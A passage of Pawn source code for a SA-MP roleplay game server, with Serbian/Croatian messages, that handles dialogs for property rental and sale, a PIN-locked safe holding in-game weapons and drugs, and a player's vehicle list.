	        if( sscanf( inputtext, "i", cena ) ) return SPD( playerid, dialog_RENTABLE, DSI, D_NASLOV, "Unesite cenu renta.\nAko uneses 0 nema rentanja u vasoj kuci.\nMaksimalna cena je 1000$", D_ODABERI, D_ODUSTANI );
	        if( cena < 0 || cena > 1000 ) return SPD( playerid, dialog_RENTABLE, DSI, D_NASLOV, "Unesite cenu renta.\nAko uneses 0 nema rentanja u vasoj kuci.\nMaksimalna cena je 1000$", D_ODABERI, D_ODUSTANI );

			if( cena == 0 ) {
	            II[ id ][ iRentable ] = 0;
				II[ id ][ iRentPrice ] = 0;
				
				PropertyRefresh( id );
				SaveProperty( id );
				SendInfoMessage( playerid, "Ugasili ste mogucnost rentanja." );
	        }
	        else if( cena > 0 ) {
	            II[ id ][ iRentable ] = 1;
				II[ id ][ iRentPrice ] = cena;
				
				PropertyRefresh( id );
				SaveProperty( id );
				SendInfoMessage( playerid, "Ukljucili ste mogucnost rentanja za %d$.", cena );
	        }
	    }
	}
	else if( dialogid == dialog_PROPSELLDRZAVA ) {
	    if( response ) {
	        if( PlayerInfo[ playerid ][ xBRacun ] < 0 ) return SendErrorMessage( playerid, "Ne mozes da prodas imovinu dok ne izadjes iz minusa u banci." );
	        new id = ChosenProperty[ playerid ];
			if( GetNearestProperty( playerid ) != id ) return SendErrorMessage( playerid, "Niste pored svoje imovine!" );
            if(ProdajeImovinu[playerid]) return SendErrorMessage(playerid, "Ne mozes to dok cekas odgovor za prodaju od igraca!");
			if( strcmp( ImeIgraca( playerid ), II[ GetNearestProperty( playerid ) ][ iOwner ], true) == 0 ) {
				if( PlayerInfo[ playerid ][ xProperty ][ 0 ] == id ) { PlayerInfo[ playerid ][ xProperty ][ 0 ] = -1; }
			    else if( PlayerInfo[ playerid ][ xProperty ][ 1 ] == id ) { PlayerInfo[ playerid ][ xProperty ][ 1 ] = -1; }
			    else if( PlayerInfo[ playerid ][ xProperty ][ 2 ] == id ) { PlayerInfo[ playerid ][ xProperty ][ 2 ] = -1; }

                new string1[ 128 ]; 
				format( string1, sizeof( string1 ), "Igrac %s je prodao imovinu ID %d na buy", ImeIgraca( playerid ), id );
				LogSave( "Ostalo/LogProdajaImovine.log", string1 );

		        strmid( II[ GetNearestProperty( playerid ) ][ iOwner], "Drzava", 0, strlen( "Drzava" ), 32);
			    DajIgracuNovac( playerid, (II[ GetNearestProperty( playerid ) ][ iPrice ]/2) );
                II[ GetNearestProperty( playerid ) ][ iNeaktivnost ] = 0;
				II[ GetNearestProperty( playerid ) ][ iOwned ] = 0; PlayerPlaySound( playerid, 1058, 0, 0, 0 );
				SavePlayer( playerid ); PropertyRefresh( GetNearestProperty( playerid ) ); SaveProperty( GetNearestProperty( playerid ) );

			} else SendErrorMessage( playerid, "Ovo nije vase.." );
	    }
	    if( !response ) {
	        SCM( playerid, -1, "Odustali ste od prodaje imovine drzavi" );
	    }
	}
	else if( dialogid == dialog_PROPSELLTP ) {
	    if( !response ) return 1;
	    if( response ) {
	        if( PlayerInfo[ playerid ][ xBRacun ] < 0 ) return SendErrorMessage( playerid, "Ne mozes da prodas imovinu dok ne izadjes iz minusa u banci." );
	        new id = ChosenProperty[ playerid ];
	        new idigraca, cena, string[ 128 ], Float:Pos[ 3 ];
	        if( sscanf( inputtext, "ui", idigraca, cena ) ) return SPD( playerid, dialog_PROPSELLTP, DSI, D_NASLOV, "U prazni prostor ispod unesite ID igraca i cenu imovina", "Ponudi", D_ODUSTANI );
            GetPlayerPos( idigraca, Pos[0], Pos[1], Pos[2] );
			if( !IsPlayerInRangeOfPoint( playerid, 3.0, Pos[0], Pos[1], Pos[2] ) ) return SendErrorMessage( playerid, "Igrac nije blizu vas");
			if( cena < 1 ) return SendErrorMessage( playerid, "Cena ne moze biti manja od 1$!");
            if( idigraca == IPI ) return SendErrorMessage( playerid, "Pogresan ID." );
			if( idigraca == playerid ) return SendErrorMessage( playerid, "Ne mozes sam sebi prodati kucu!");
			if( PlayerInfo[ idigraca ][ xProperty ][ 0 ] != -1 && PlayerInfo[ idigraca ][ xProperty ][ 1 ] != -1 && PlayerInfo[ idigraca ][ xProperty ][ 2 ] != -1 )return SendErrorMessage( playerid, "Igrac vec ima 3 imovine!");
            if( PlayerInfo[ idigraca ][ xLevel ] < II[ id ][ iLevel ] ) return SendClientMessageEx( playerid, CRVENA, "Da bi ste tom igracu prodali ovu imovinu, on mora biti level %d+.", II[ id ][ iLevel ] );
            SendClientMessageEx( playerid, SVETLOPLAVA, "Ponudili ste igracu %s imovinu po ceni od %d.", ImeIgraca( idigraca ), cena );
			GlobalProdaja[ idigraca ] = playerid;
			GlobalCena[ idigraca ] = cena;
			GlobalID[ idigraca ] = id;
            ProdajeImovinu[playerid] = true;
			format( string, sizeof( string ), "Igrac %s vam je ponudio da kupite njegovu imovinu za %d", ImeIgraca( playerid ), cena );
			SPD( idigraca, dialog_ACCEPTPROP, DSMSG, D_NASLOV, string, "Prihvati", "Odbij" );
	    }
	}
	else if( dialogid == dialog_ACCEPTPROP) {
	    if( response ) {
	        new id = GlobalID[ playerid ];
	        if( PlayerInfo[ playerid ][ xNovac ] < GlobalCena[ playerid ] ) return SendErrorMessage( playerid, "Nemate dovoljno novca.");

			if( PlayerInfo[ GlobalProdaja[ playerid ] ][ xProperty ][ 0 ] == id ) { PlayerInfo[ GlobalProdaja[ playerid ] ][ xProperty ][ 0 ] = -1; }
			else if( PlayerInfo[ GlobalProdaja[ playerid ] ][ xProperty ][ 1 ] == id ) { PlayerInfo[ GlobalProdaja[ playerid ] ][ xProperty ][ 1 ] = -1; }
			else if( PlayerInfo[ GlobalProdaja[ playerid ] ][ xProperty ][ 2 ] == id ) { PlayerInfo[ GlobalProdaja[ playerid ] ][ xProperty ][ 2 ] = -1; }

			if( PlayerInfo[ playerid ][ xProperty ][ 0 ] == -1 ) { PlayerInfo[ playerid ][ xProperty ][ 0 ] = id; }
		    else if( PlayerInfo[ playerid ][ xProperty ][ 1 ] == -1 ) { PlayerInfo[ playerid ][ xProperty ][ 1 ] = id; }
		    else if( PlayerInfo[ playerid ][ xProperty ][ 2 ] == -1 ) { PlayerInfo[ playerid ][ xProperty ][ 2 ] = id; }

            new string1[ 128 ]; 
			format( string1, sizeof( string1 ), "Igrac %s je prodao imovinu ID %d igracu %s za %d", ImeIgraca( GlobalProdaja[ playerid ] ), id, ImeIgraca( playerid ), GlobalCena[ playerid ] );
			LogSave( "Ostalo/LogProdajaImovine.log", string1 );
			
            SendClientMessageEx( playerid, SVETLOPLAVA, "Uspesno ste kupili imovinu od igraca %s za $d.", ImeIgraca( GlobalProdaja[ playerid ] ), GlobalCena[ playerid ] );
			strmid( II[ id ][ iOwner ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), 255);
			SaveProperty( id ); PropertyRefresh( id );
			SavePlayer( playerid ); SavePlayer( GlobalProdaja[ playerid ] );
			format( globalstring, sizeof( globalstring ), "Prodali ste kucu igracu %s za %d!", ImeIgraca( playerid ), GlobalCena[ playerid ] );
			SCM( GlobalProdaja[ playerid ], -1, globalstring );
            ProdajeImovinu[GlobalProdaja[playerid]] = false;
			DajIgracuNovac( GlobalProdaja[ playerid ], GlobalCena[ playerid ] );
			DajIgracuNovac( playerid, -GlobalCena[ playerid ] );
			SCM( playerid, -1, "Kupili ste kucu!" );
			GlobalProdaja[ playerid ] = -1;
			GlobalCena[ playerid ] = -1;
			GlobalID[ playerid ] = -1;
	    }
	    else if( !response ) {
			format( globalstring, sizeof( globalstring ),"Igrac %s je odbio vasu ponudu za kupovinu imovine!", ImeIgraca( playerid ) );
			SCM( GlobalProdaja[ playerid ], -1, globalstring );
            ProdajeImovinu[GlobalProdaja[playerid]] = false;
			SCM( playerid, -1, "Odbili ste ponudu!");
			GlobalProdaja[ playerid ] = -1;
			GlobalCena[ playerid ] = -1;
			GlobalID[ playerid ] = -1;
	    }
	}
	else if( dialogid == dialog_SAFEALL ) {
	    if( !response ) return 1;
	    if( response ) {
	        switch( listitem ) {
				case 0: {
				    new hid = inProperty[ playerid ];
				    new wepname1[32], wepname2[32], wepname3[32], wepname4[32];

				    new drug1 = II[ hid ][ iDrugCode ][ 0 ],
					drug2 = II[ hid ][ iDrugCode ][ 1 ],
					drug3 = II[ hid ][ iDrugCode ][ 2 ],
					drug4 = II[ hid ][ iDrugCode ][ 3 ],
					drug5 = II[ hid ][ iDrugCode ][ 4 ],
					drug6 = II[ hid ][ iDrugCode ][ 5 ],
					drug7 = II[ hid ][ iDrugCode ][ 6 ],
					drug8 = II[ hid ][ iDrugCode ][ 7 ],
					drug9 = II[ hid ][ iDrugCode ][ 8 ],
					drug10 = II[ hid ][ iDrugCode ][ 9 ];

					if( II[ hid ][ iOruzje ][ 0 ] != 0)
					    format( wepname1, sizeof( wepname1 ), "%s", WeapNames[ II[ hid ][ iOruzje ][ 0 ] ] );
					else
						strmid(wepname1, "None", 0, 5);

					if( II[ hid ][ iOruzje ][ 1 ] != 0)
					    format( wepname2, sizeof( wepname2 ), "%s", WeapNames[ II[ hid ][ iOruzje ][ 1 ] ] );
					else
					    strmid(wepname2, "None", 0, 5);

	                if( II[ hid ][ iOruzje ][ 2 ] != 0)
					    format( wepname3, sizeof( wepname3 ), "%s", WeapNames[ II[ hid ][ iOruzje ][ 2 ] ] );
					else
						strmid(wepname3, "None", 0, 5);

					if( II[ hid ][ iOruzje ][ 3 ] != 0)
					    format( wepname4, sizeof( wepname4 ), "%s", WeapNames[ II[ hid ][ iOruzje ][ 3 ] ] );
					else
					    strmid(wepname4, "None", 0, 5);

	                if( II[ hid ][ iSafeStatus ] == 1 ) {
	                    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
	                    format( globalstring, sizeof( globalstring ), "Drug1: %s(%d g) | Drug2: %s(%d g)\n", GetDrugNameByDrugID(drug1), II[ hid ][ iDrug ][ 0 ], GetDrugNameByDrugID(drug2), II[ hid ][ iDrug ][ 1 ] );
	                   	strcat( DialogStrgEx, globalstring );

	                   	format( globalstring, sizeof( globalstring ), "Drug3: %s(%d g) | Drug4: %s(%d g)\n", GetDrugNameByDrugID(drug3), II[ hid ][ iDrug ][ 2 ], GetDrugNameByDrugID(drug4), II[ hid ][ iDrug ][ 3 ] );
	                   	strcat( DialogStrgEx, globalstring );

	                   	format( globalstring, sizeof( globalstring ), "Drug5: %s(%d g) | Drug6: %s(%d g)\n", GetDrugNameByDrugID(drug5), II[ hid ][ iDrug ][ 4 ], GetDrugNameByDrugID(drug6), II[ hid ][ iDrug ][ 5 ] );
	                   	strcat( DialogStrgEx, globalstring );

	                   	format( globalstring, sizeof( globalstring ), "Drug7: %s(%d g) | Drug8: %s(%d g)\n", GetDrugNameByDrugID(drug7), II[ hid ][ iDrug ][ 6 ], GetDrugNameByDrugID(drug8), II[ hid ][ iDrug ][ 7 ] );
	                   	strcat( DialogStrgEx, globalstring );

	                   	format( globalstring, sizeof( globalstring ), "Drug9: %s(%d g) | Drug10 : %s(%d g)\n", GetDrugNameByDrugID(drug9), II[ hid ][ iDrug ][ 8 ], GetDrugNameByDrugID(drug10), II[ hid ][ iDrug ][ 9 ] );
	                   	strcat( DialogStrgEx, globalstring );

	                   	format( globalstring, sizeof( globalstring ), "Slot 1:[%s]    |    Metaka: %d\n", wepname1, II[ hid ][ iMunicija ][ 0 ] );
						strcat( DialogStrgEx, globalstring );

						format( globalstring, sizeof( globalstring ), "Slot 2:[%s]    |    Metaka: %d\n", wepname2, II[ hid ][ iMunicija ][ 1 ] );
						strcat( DialogStrgEx, globalstring );

						format( globalstring, sizeof( globalstring ), "Slot 3:[%s]    |    Metaka: %d\n", wepname3, II[ hid ][ iMunicija ][ 2 ] );
						strcat( DialogStrgEx, globalstring );

						format( globalstring, sizeof( globalstring ), "Slot 4:[%s]    |    Metaka: %d", wepname4, II[ hid ][ iMunicija ][ 3 ] );
						strcat( DialogStrgEx, globalstring );

	                   	SPD( playerid, 0, DSMSG, D_NASLOV, DialogStrgEx, "Potvrdi", "" );
	    				strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));

					}
					else return SendErrorMessage( playerid, "Sef je zakljucan!");
				}
				case 1: {
				    SPD( playerid, dialog_SAFECHANGEPASS, DSI, D_NASLOV, "Sifra mora biti u brojevima i mora biti u duzini od 6 karaktera.\nUnesi novu lozinku za sef.", D_ODABERI, D_ODUSTANI );
				}
				case 2: {
				    new hid = inProperty[ playerid ];
				    if( II[ hid ][ iSafeStatus ] == 1 ) {
				        II[ hid ][ iSafeStatus ] = 0; SaveProperty( hid );
		            	SCM( playerid, SRVBOJA1, "Indetitet potvrdjen. Sef je zakljucan!");
				    }
				    else {
				        SPD( playerid, dialog_SAFEUNLOCK, DSI, D_NASLOV, "Unesi svoju lozinku sefa za otkljucavanje.", D_ODABERI, D_ODUSTANI );
				    }
				}
				case 3: {
				    new hid = inProperty[ playerid ];
				    if( II[ hid ][ iSafeStatus ] == 0 ) return SendErrorMessage( playerid, "Sef je zakljucan!");
				    SPD( playerid, dialog_SAFEPUTDRUG, DSI, D_NASLOV, "Unesite slot droge kod igraca i kolicinu droge za ostavljanje.\nPrimer: 1 232.", D_ODABERI, D_ODUSTANI );
				}
				case 4: {
				    new hid = inProperty[ playerid ];
				    if( II[ hid ][ iSafeStatus ] == 0 ) return SendErrorMessage( playerid, "Sef je zakljucan!");
				    SPD( playerid, dialog_SAFETAKEDRUG, DSI, D_NASLOV, "Unesite slot droge u imovini i kolicinu droge za uzimanje.\nPrimer: 1 232.", D_ODABERI, D_ODUSTANI );
				}
				case 5: {
				    if( GetFactionType( playerid ) == ORG_TIP_PD || GetFactionType( playerid ) == ORG_TIP_HITM ) {
				        SendErrorMessage( playerid, "PD/FBI/CIA/HITMAN nema razloga ubacivati oruzja u sef!");
						return 1;
					}
                    if( NaDmEventu[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes ovo dok si na dmu." );
					new wepname[32];
				    new hid = inProperty[ playerid ];
				    
				    if( ForbiddenWeap( playerid ) ) return SendErrorMessage( playerid, "Ne mozes ubaciti zabranjena oruzja u sef." );
	                if( II[ hid ][ iSafeStatus ] == 0 ) return SendErrorMessage( playerid, "Sef je zakljucan!");
					if( II[ hid ][ iOruzje ][ 0 ] != 0 && II[ hid ][ iOruzje ][ 1 ] != 0 && II[ hid ][ iOruzje ][ 2 ] != 0 && II[ hid ][ iOruzje ][ 3 ] != 0 ) return SendErrorMessage( playerid, "Slotovi za oruzja su zauzeti!");
					if( II[ hid ][ iOruzje ][ 0 ] == 0) {
						if( ( II[ hid ][ iMunicija ][ 0 ] + GetPlayerAmmo( playerid ) ) < 501 ) {

	                        format( wepname, sizeof( wepname ), "%s", WeapNames[ GetWeapon( playerid ) ] );
                            antiCheatCS[ playerid ][ WeaponDetect ] = 3;
				            II[ hid ][ iMunicija ][ 0 ] = GetPlayerAmmo( playerid );
				            II[ hid ][ iOruzje ][ 0 ] = GetWeapon( playerid );
							RemovePlayerWeapon( playerid, GetWeapon( playerid ) );
							SaveProperty( hid );

							format( globalstring, sizeof( globalstring ), "* %s sprema %s u sef.", ImeIgraca( playerid ), wepname);
							PorukaRadius(6.0, playerid, globalstring, LJUBICASTA );
						} else SendErrorMessage( playerid, "U 1 slotu mozete staviti najvise 500 metaka!");
					}
					else if( II[ hid ][ iOruzje ][ 1 ] == 0) {
						if( ( II[ hid ][ iMunicija ][ 1 ] + GetPlayerAmmo( playerid ) ) < 501 ) {
						    format( wepname, sizeof( wepname ), "%s", WeapNames[ GetWeapon( playerid ) ] );
                            antiCheatCS[ playerid ][ WeaponDetect ] = 3;
				            II[ hid ][ iMunicija ][ 1 ] = GetPlayerAmmo( playerid );
				            II[ hid ][ iOruzje ][ 1 ] = GetWeapon( playerid );
							RemovePlayerWeapon( playerid, GetWeapon( playerid ) );
							SaveProperty( hid );

							format( globalstring, sizeof( globalstring ), "* %s sprema %s u sef.", ImeIgraca( playerid ), wepname);
							PorukaRadius(6.0, playerid, globalstring, LJUBICASTA );
						} else SendErrorMessage( playerid, "U 1 slotu mozete staviti najvise 500 metaka!");
					}
					else if( II[ hid ][ iOruzje ][ 2 ] == 0) {
						if( ( II[ hid ][ iMunicija ][ 2 ] + GetPlayerAmmo( playerid ) ) < 501 ) {
						    format( wepname, sizeof( wepname ), "%s", WeapNames[ GetWeapon( playerid ) ] );
                            antiCheatCS[ playerid ][ WeaponDetect ] = 3;
				            II[ hid ][ iMunicija ][ 2 ] = GetPlayerAmmo( playerid );
				            II[ hid ][ iOruzje ][ 2 ] = GetWeapon( playerid );
							RemovePlayerWeapon( playerid, GetWeapon( playerid ) );
							SaveProperty( hid );

							format( globalstring, sizeof( globalstring ), "* %s sprema %s u sef.", ImeIgraca( playerid ), wepname);
							PorukaRadius(6.0, playerid, globalstring, LJUBICASTA );
						} else SendErrorMessage( playerid, "U 1 slotu mozete staviti najvise 500 metaka!");
					}
					else if( II[ hid ][ iOruzje ][ 3 ] == 0) {
						if( ( II[ hid ][ iMunicija ][ 3 ] + GetPlayerAmmo( playerid ) ) < 501 ) {
						    format( wepname, sizeof( wepname ), "%s", WeapNames[ GetWeapon( playerid ) ] );
                            antiCheatCS[ playerid ][ WeaponDetect ] = 3;
				            II[ hid ][ iMunicija ][ 3 ] = GetPlayerAmmo( playerid );
				            II[ hid ][ iOruzje ][ 3 ] = GetWeapon( playerid );
							RemovePlayerWeapon( playerid, GetWeapon( playerid ) );
							SaveProperty( hid );

							format( globalstring, sizeof( globalstring ), "* %s sprema %s u sef.", ImeIgraca( playerid ), wepname);
							PorukaRadius(6.0, playerid, globalstring, LJUBICASTA );
						} else SendErrorMessage( playerid, "U 1 slotu mozete staviti najvise 500 metaka!");
					}
				}
				case 6: {
				    new hid = inProperty[ playerid ];
				    if( II[ hid ][ iSafeStatus ] == 0 ) return SendErrorMessage( playerid, "Sef je zakljucan!");
				    new wepname1[32], wepname2[32], wepname3[32], wepname4[32];
				    if( II[ hid ][ iOruzje ][ 0 ] == 0 && II[ hid ][ iOruzje ][ 1 ] == 0 && II[ hid ][ iOruzje ][ 2 ] == 0 && II[ hid ][ iOruzje ][ 3 ] == 0 ) return SendErrorMessage( playerid, "Svi slotovi su prazni!");
					if( II[ hid ][ iOruzje ][ 0 ] != 0)
					    format( wepname1, sizeof( wepname1 ), "%s", WeapNames[ II[ hid ][ iOruzje ][ 0 ] ] );
					else
					    format(wepname1, sizeof(wepname1), "None");

					if( II[ hid ][ iOruzje ][ 1 ] != 0)
					    format( wepname2, sizeof( wepname2 ), "%s", WeapNames[ II[ hid ][ iOruzje ][ 1 ] ] );
					else
					    format(wepname2, sizeof(wepname2), "None");

				    if( II[ hid ][ iOruzje ][ 2 ] != 0)
					    format( wepname3, sizeof( wepname3 ), "%s", WeapNames[ II[ hid ][ iOruzje ][ 2 ] ] );
					else
					    format(wepname3, sizeof(wepname3), "None");

	                if( II[ hid ][ iOruzje ][ 3 ] != 0)
					    format( wepname4, sizeof( wepname4 ), "%s", WeapNames[ II[ hid ][ iOruzje ][ 3 ] ] );
					else
					    format(wepname4, sizeof(wepname4), "None");
				    PropertySafeGun[ playerid ] = hid;
				    format( globalstring, sizeof( globalstring ), "%s\n%s\n%s\n%s", wepname1, wepname2, wepname3, wepname4 );
					SPD( playerid, dialog_PROPERTYWEPTAKE, DSL, D_NASLOV, globalstring, D_ODABERI, D_ODUSTANI );
				}
			}
	    }
	}
	else if( dialogid == dialog_SAFETAKEDRUG ) {
	    if( !response ) return 1;
	    if( response ) {
	        new slot, slot2, kolicina, hid = inProperty[ playerid ];
			if( sscanf( inputtext, "dd", slot, kolicina ) ) return SPD( playerid, dialog_SAFETAKEDRUG, DSI, D_NASLOV, "Unesite slot droge u imovini i kolicinu droge za uzimanje.\nPrimer: 1 232.", D_ODABERI, D_ODUSTANI );
		    if( II[ hid ][ iSafeStatus ] == 0 ) return SendErrorMessage( playerid, "Sef je zakljucan!");
		    if( slot < 1 || slot > 10 ) return SendErrorMessage( playerid, "Krivi broj slota!");
			slot2 = slot-1;
			if( II[ hid ][ iDrugCode ][ slot2 ] == 0 ) return SendErrorMessage( playerid, "Ova imovina nema drogu pod tim slotom!");
	       	if( kolicina < 1 || kolicina > II[ hid ][ iDrug ][ slot2 ] ) return SendErrorMessage( playerid, "Ova imovina nema toliko droge pod tim slotom!");


			if( PlayerInfo[ playerid ][ xDrugCode ][ 0 ] == 0 ) {
			    PlayerInfo[ playerid ][ xDrugCode ][ 0 ] = II[ hid ][ iDrugCode ][ slot2 ];
			    PlayerInfo[ playerid ][ xDrug ][ 0 ] = kolicina;
			}
			else if( PlayerInfo[ playerid ][ xDrugCode ][ 1 ] == 0 ) {
			    PlayerInfo[ playerid ][ xDrugCode ][ 1 ] = II[ hid ][ iDrugCode ][ slot2 ];
			    PlayerInfo[ playerid ][ xDrug ][ 1 ] = kolicina;
			}
			else if( PlayerInfo[ playerid ][ xDrugCode ][ 2 ] == 0 ) {
			    PlayerInfo[ playerid ][ xDrugCode ][ 2 ] = II[ hid ][ iDrugCode ][ slot2 ];
			    PlayerInfo[ playerid ][ xDrug ][ 2 ] = kolicina;
			}
			else if( PlayerInfo[ playerid ][ xDrugCode ][ 3 ] == 0 ) {
			    PlayerInfo[ playerid ][ xDrugCode ][ 3 ] = II[ hid ][ iDrugCode ][ slot2 ];
			    PlayerInfo[ playerid ][ xDrug ][ 3 ] = kolicina;
			}
			else if( PlayerInfo[ playerid ][ xDrugCode ][ 4 ] == 0 ) {
			    PlayerInfo[ playerid ][ xDrugCode ][ 4 ] = II[ hid ][ iDrugCode ][ slot2 ];
		    	PlayerInfo[ playerid ][ xDrug ][ 4 ] = kolicina;
			}
			else return SendErrorMessage( playerid, "Svi slotovi su puni." );
			
			II[ hid ][ iDrug ][ slot2 ] -= kolicina;
		    format( globalstring, sizeof( globalstring ), "* %s uzima nesto iz sefa.", ImeIgraca( playerid ) );
			PorukaRadius( 10.0, playerid, globalstring, LJUBICASTA );
			SendClientMessageEx( playerid, SRVBOJA1, "Uzeli ste %d grama %s iz sefa.", kolicina, GetDrugNameByDrugID( II[ hid ][ iDrugCode ][ slot2 ] ) );

			if( II[ hid ][ iDrug ][ slot2 ] <= 0 )
			    II[ hid ][ iDrugCode ][ slot2 ] = 0;

			SaveProperty( hid );
	    }
	}
	else if( dialogid == dialog_SAFEPUTDRUG ) {
	    if( !response ) return 1;
	    if( response ) {
    		new slot, slot2, kolicina, hid = inProperty[ playerid ];
		    if( sscanf( inputtext, "dd", slot, kolicina ) ) return SPD( playerid, dialog_SAFEPUTDRUG, DSI, D_NASLOV, "Unesite slot droge kod igraca i kolicinu droge za ostavljanje.\nPrimer: 1 232.", D_ODABERI, D_ODUSTANI );
	        if( II[ hid ][ iSafeStatus ] == 0 ) return SendErrorMessage( playerid, "Sef je zakljucan!");
		    if( slot < 1 || slot > 5 ) return SendErrorMessage( playerid, "Krivi broj slota!");
			slot2 = slot-1;
		    if( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] == 0 ) return SendErrorMessage( playerid, "Nemate droge pod tim slotom!" );
		    if( kolicina < 1 || kolicina > PlayerInfo[ playerid ][ xDrug ][ slot2 ] ) return SendErrorMessage( playerid, "Nemate toliko droge pod tim slotom!");
            if( kolicina > 500 ) return SendErrorMessage( playerid, "Najvise u 1 slotu sefa moze stati 500g droge." );
			if( II[ hid ][ iDrugCode ][ 0 ] != 0 && II[ hid ][ iDrugCode ][ 1 ] != 0 && II[ hid ][ iDrugCode ][ 2 ] != 0 && II[ hid ][ iDrugCode ][ 3 ] != 0 && II[ hid ][ iDrugCode ][ 4 ] != 0 &&
				II[ hid ][ iDrugCode ][ 5 ] != 0 && II[ hid ][ iDrugCode ][ 6 ] != 0 && II[ hid ][ iDrugCode ][ 7 ] != 0 && II[ hid ][ iDrugCode ][ 8 ] != 0 && II[ hid ][ iDrugCode ][ 9 ] != 0) return SendErrorMessage( playerid, "Svih 10 slotova kuce su zauzeti!");

            PlayerInfo[ playerid ][ xDrug ][ slot2 ] -= kolicina;
		    format( globalstring, sizeof( globalstring ), "* %s stavlja nesto u sef.", ImeIgraca( playerid ) );
			PorukaRadius( 10.0, playerid, globalstring, LJUBICASTA );
		    SendClientMessageEx( playerid, SRVBOJA1, "Stavili ste %d grama %s u sef.", kolicina , GetDrugNameByDrugID( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) );

            if( II[ hid ][ iDrugCode ][ 0 ] == 0 ) {
			    II[ hid ][ iDrugCode ][ 0 ] = PlayerInfo[ playerid ][ xDrugCode ][ slot2 ];
			    II[ hid ][ iDrug ][ 0 ] = kolicina;
			}
			else if( II[ hid ][ iDrugCode ][ 1 ] == 0) {
			    II[ hid ][ iDrugCode ][ 1 ] = PlayerInfo[ playerid ][ xDrugCode ][ slot2 ];
			    II[ hid ][ iDrug ][ 1 ] = kolicina;
			}
			else if( II[ hid ][ iDrugCode ][ 2 ] == 0) {
			    II[ hid ][ iDrugCode ][ 2 ] = PlayerInfo[ playerid ][ xDrugCode ][ slot2 ];
			    II[ hid ][ iDrug ][ 2 ] = kolicina;
			}
			else if( II[ hid ][ iDrugCode ][ 3 ] == 0) {
			    II[ hid ][ iDrugCode ][ 3 ] = PlayerInfo[ playerid ][ xDrugCode ][ slot2 ];
			    II[ hid ][ iDrug ][ 3 ] = kolicina;
			}
			else if( II[ hid ][ iDrugCode ][ 4 ] == 0) {
			    II[ hid ][ iDrugCode ][ 4 ] = PlayerInfo[ playerid ][ xDrugCode ][ slot2 ];
			    II[ hid ][ iDrug ][ 4 ] = kolicina;
			}
			else if( II[ hid ][ iDrugCode ][ 5 ] == 0) {
			    II[ hid ][ iDrugCode ][ 5 ] = PlayerInfo[ playerid ][ xDrugCode ][ slot2 ];
			    II[ hid ][ iDrug ][ 5 ] = kolicina;
			}
			else if( II[ hid ][ iDrugCode ][ 6 ] == 0) {
			    II[ hid ][ iDrugCode ][ 6 ] = PlayerInfo[ playerid ][ xDrugCode ][ slot2 ];
			    II[ hid ][ iDrug ][ 6 ] = kolicina;
			}
			else if( II[ hid ][ iDrugCode ][ 7 ] == 0) {
			    II[ hid ][ iDrugCode ][ 7 ] = PlayerInfo[ playerid ][ xDrugCode ][ slot2 ];
			    II[ hid ][ iDrug ][ 7 ] = kolicina;
			}
			else if( II[ hid ][ iDrugCode ][ 8 ] == 0) {
			    II[ hid ][ iDrugCode ][ 8 ] = PlayerInfo[ playerid ][ xDrugCode ][ slot2 ];
			    II[ hid ][ iDrug ][ 8 ] = kolicina;
			}
			else if( II[ hid ][ iDrugCode ][ 9 ] == 0) {
			    II[ hid ][ iDrugCode ][ 9 ] = PlayerInfo[ playerid ][ xDrugCode ][ slot2 ];
			    II[ hid ][ iDrug ][ 9 ] = kolicina;
			}
			SaveProperty( hid );

			if( PlayerInfo[ playerid ][ xDrug ][ slot2 ] <= 0)
			    PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] = 0;
	    }
	}
	else if( dialogid == dialog_SAFEUNLOCK ) {
	    if( !response ) return 1;
	    if( response ) {
	        new sifra, hid = inProperty[ playerid ];
			if( sscanf( inputtext, "d", sifra ) ) return SPD( playerid, dialog_SAFEUNLOCK, DSI, D_NASLOV, "Unesi svoju lozinku sefa za otkljucavanje.", D_ODABERI, D_ODUSTANI );
	   		if( II[ hid ][ iSafeStatus ] == 1 ) return SendErrorMessage( playerid, "Sef je vec otkljucan!" );
	   		if( sifra != II[ hid ][ iSafePass ] ) return SendErrorMessage( playerid, "Sifra je pogresna." );
			II[ hid ][ iSafeStatus ] = 1; SaveProperty( hid );
		    SCM( playerid, SRVBOJA1, "Indetitet potvrdjen. Sef je otkljucan!");
		}
	}
	else if( dialogid == dialog_SAFECHANGEPASS ) {
	    if( !response ) return 1;
	    if( response ) {
	        new sifra, hid = inProperty[ playerid ];
		    if( sscanf( inputtext, "d", sifra ) ) return SPD( playerid, dialog_SAFECHANGEPASS, DSI, D_NASLOV, "Unesi novu lozinku za sef.", D_ODABERI, D_ODUSTANI );
		    if( sifra < 111111 || sifra > 999999 ) return SendErrorMessage( playerid, "Nevaljana kombinacija. Sifra mora biti u brojevima i mora biti u duzini od 6 karaktera.");
			II[ hid ][ iSafePass ] = sifra; SaveProperty( hid );
		    SCM( playerid, SRVBOJA1, "Sifra je promjenjena. Nemojte je zaboravit!");
	        SendClientMessageEx( playerid, BELA, "Nova sifra: %d", sifra );
	    }
	}
	
	else if( dialogid == dialog_VEHLIST ) {
	    if( !response ) return 1;
		if( response ) {
			switch( listitem ) {
				case 0: {
				    if( PlayerInfo[ playerid ][ xVoziloID ][ 0 ] == -1 ) return SendErrorMessage( playerid, "Ti ne posedujes vozilo u ovom slotu.");
				    if( PlayerInfo[ playerid ][ xVoziloID ][ 0 ] == 0 ) return SendErrorMessage( playerid, "Ti ne posedujes vozilo u ovom slotu.");
				    new vFile[ 50 ];
			        format( vFile, sizeof( vFile ), V_FILE, PlayerInfo[ playerid ][ xVoziloID ][ 0 ] );
			        if( fexist( vFile ) ) {
						if( strcmp( ImeIgraca( playerid ), VehicleInfo[ PlayerInfo[ playerid ][ xVoziloID ][ 0 ] ][ vOwner ], true ) == 0 ) {
							ChosenVehicle[ playerid ] = PlayerInfo[ playerid ][ xVoziloID ][ 0 ];
	                        SPD( playerid, dialog_VEHCHOSEN, DSL, "Vozilo", "Informacije\nParkiraj\nLociraj\nUgradi GPS\nProdaj igracu\nProdaj otpadu\nMakni tuning\nNeon\nGepek\nPromeni boju", "Odaberi", "Nazad" );
	                    }
	                    else {
							SCM( playerid, ANTICHEAT, "| V:AC | Ovo vozilo nije u vasem vlasnistvu, obratite se na forumu ako mislite je greska." );
						}
					}
					else {
